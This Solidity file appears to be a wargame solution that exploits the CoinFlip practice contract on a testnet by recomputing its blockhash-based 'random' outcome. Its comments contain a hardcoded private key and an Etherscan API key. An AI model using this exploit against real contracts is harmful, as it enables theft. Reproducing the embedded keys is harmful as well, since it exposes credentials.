// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// source .env
// forge script ./script/level03.sol --private-key ${PRIVATE_KEY} --broadcast --rpc-url ${GOERLI_RPC_URL}

/* forge create script/level03.sol:Hack --private-key 0x33debf18f693abae3521e80fc2e64320d639652c524107228e5e2bcc2fcc8a1b --rpc-url ${GOERLI_RPC_URL} --constructor-args "0x1dd2DF5142538551121bc975dF504869B7cB5b2c"  --etherscan-api-key ${ETHERSCAN_API_KEY} --verify */

/* forge create --rpc-url ${GOERLI_RPC_URL} --constructor-args "0x1dd2DF5142538551121bc975dF504869B7cB5b2c" --private-key 0x33debf18f693abae3521e80fc2e64320d639652c524107228e5e2bcc2fcc8a1b script/level03.sol:Hack --etherscan-api-key RYX96EXA44SAEB2S8GY8MUQN4G7R66U1S4 --verify */

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Hack {
    ICoinFlip private immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    // call this function 10 times
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}